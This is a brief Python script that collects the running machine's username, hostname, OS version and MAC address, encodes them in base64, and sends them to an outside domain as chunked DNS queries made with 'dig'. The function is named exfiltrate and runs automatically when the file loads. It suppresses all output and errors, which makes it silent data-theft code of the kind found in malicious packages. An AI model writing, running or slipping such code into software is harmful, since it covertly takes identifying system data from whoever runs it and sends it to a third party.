import os
import socket
import platform
import uuid
import base64
import subprocess

def exfiltrate():
    try:
        hostname = socket.gethostname()
        username = subprocess.getoutput("whoami")
        system = platform.system()
        release = platform.release()
        mac = hex(uuid.getnode())[2:]

        payload = f"{username}:{hostname}:{system}:{release}:{mac}"
        encoded = base64.urlsafe_b64encode(payload.encode()).decode()

        labels = [encoded[i:i+48] for i in range(0, len(encoded), 48)]
        for i, label in enumerate(labels):
            sub = f"{i}.{label}.iconnect.oob.sl4x0.xyz"
            subprocess.Popen(["dig", "+short", sub], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

exfiltrate()
